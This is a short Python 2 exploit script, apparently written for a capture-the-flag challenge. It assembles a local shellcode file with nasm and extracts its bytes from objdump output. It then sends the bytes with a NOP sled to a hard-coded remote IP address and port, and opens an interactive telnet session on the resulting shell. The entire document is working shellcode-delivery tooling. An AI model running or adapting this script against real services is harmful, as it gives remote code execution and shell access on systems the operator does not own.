#!/usr/bin/env python2
import commands
import os
import telnetlib

from socket import *
import struct
import sys

def p64(n):
    return struct.pack('<Q', n)
def up64(s):
    return struct.unpack('<Q', s)[0]

def build(name):
    source = "%s.S" % name
    obj = "%s.o" % name
    os.system("nasm -felf64 %s -o %s" % (source, obj))
    os.system("ld -s -o %s %s" % (name, obj))
    lines = commands.getoutput("objdump -D %s" % name).splitlines()

    while True:
        line = lines.pop(0)
        if ("<.text>") in line:
            break

    if "..." in lines[-1]:
        lines[-1] = "\t00\t"

    return ''.join(map(lambda line: line.split("\t")[1].replace(" ", ""), lines))

#ADDR = ('localhost', 1234)
ADDR = ('136.243.194.42', 1024)
if __name__ == '__main__':
    sc = (build("shellcode") + "90" * 8).decode("hex")

    s = create_connection(ADDR)
    f = s.makefile(bufsize = 0)
    print (f.readline()),
    f.write(sc)

    tn = telnetlib.Telnet()
    tn.sock = s
    tn.interact()
